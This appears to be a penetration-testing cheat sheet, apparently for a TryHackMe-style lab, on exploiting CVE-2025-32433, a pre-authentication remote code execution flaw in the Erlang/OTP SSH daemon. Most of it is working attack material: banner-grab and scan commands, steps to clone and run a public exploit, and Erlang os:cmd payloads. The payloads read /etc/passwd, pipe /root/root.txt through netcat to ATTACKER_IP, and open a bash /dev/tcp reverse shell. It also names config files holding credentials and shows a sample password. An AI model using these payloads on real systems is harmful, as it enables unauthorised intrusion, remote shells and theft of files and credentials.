# Erlang OTP SSH - CVE-2025-32433

Pre-authentication RCE in Erlang/OTP SSH daemon.

**Affects:** Erlang/OTP versions with SSH daemon

---

## Discovery

```bash
# Banner grab
nc TARGET 2222
# Response: SSH-2.0-Erlang/5.2.9

# Via nmap
nmap -sV -p 2222 TARGET
```

**Indicators:**
- SSH banner contains `Erlang`
- Often runs on non-standard ports (2222, etc.)
- May only listen on localhost (requires port forward)

---

## CVE-2025-32433 - Pre-Auth RCE

**Vulnerability:** Pre-authentication command execution via malformed SSH channel request.

### Exploit

```bash
# Clone exploit
git clone https://github.com/platsecurity/CVE-2025-32433.git
cd CVE-2025-32433

# If service is on localhost, port forward first
ssh user@TARGET -L 2222:127.0.0.1:2222

# Run exploit (default writes to /lab.txt as PoC)
python3 CVE-2025-32433.py
```

### Custom Payload

Modify the exploit to execute arbitrary commands:

```python
# In exploit, change the command payload:
command = 'os:cmd("cat /root/root.txt | nc ATTACKER_IP 4444").'

# Or for reverse shell:
command = 'os:cmd("bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'").'
```

### Manual Erlang Commands

```erlang
% Read file
os:cmd("cat /etc/passwd").

% Command execution
os:cmd("id").

% Exfiltrate via netcat
os:cmd("cat /root/root.txt | nc ATTACKER_IP 4444").

% Reverse shell
os:cmd("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").
```

---

## Finding Erlang SSH Services

```bash
# Linpeas output
/usr/local/lib/erlang_login/start.escript

# Process list
ps aux | grep erlang
ps aux | grep ssh_runner

# Listening ports
ss -tlnp | grep erlang
netstat -tlnp | grep 2222
```

---

## Configuration Files

Erlang SSH daemons may have credentials in config:

```erlang
% Example from start.escript
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

**Common locations:**
```
/usr/local/lib/erlang_login/start.escript
/opt/erlang/*/start.escript
```

---

## References

- https://medium.com/@RosanaFS/erlang-otp-ssh-cve-2025-32433-tryhackme-e410df5f1b53
- https://github.com/platsecurity/CVE-2025-32433
